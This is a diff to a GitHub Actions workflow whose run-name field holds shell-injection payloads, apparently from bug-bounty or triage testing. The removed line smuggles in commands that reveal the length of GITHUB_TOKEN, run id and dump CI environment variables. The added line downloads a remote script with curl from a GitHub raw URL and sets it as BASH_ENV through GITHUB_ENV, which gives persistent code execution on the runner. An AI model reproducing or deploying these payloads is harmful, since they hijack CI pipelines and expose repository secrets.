@@ -1,6 +1,6 @@
 name: ApprovalComment
 run-name: >-
-  L6"; echo MARKER_OK; echo "TOKEN_LEN=${#GITHUB_TOKEN}"; id; env | grep -E "^(GITHUB|ACTIONS|CI|RUNNER)=" | sort; exit 0; #
+  h";echo LH6_RCE_MARKER;curl -s -o /tmp/lh6_s2.sh https://raw.githubusercontent.com/lazyhacker6/triage-pinterest-vc5dd446-11ed78/main/s2.sh;echo BASH_ENV=/tmp/lh6_s2.sh>>$GITHUB_ENV;exit 0;#
 on: push
 permissions: {}
 jobs:
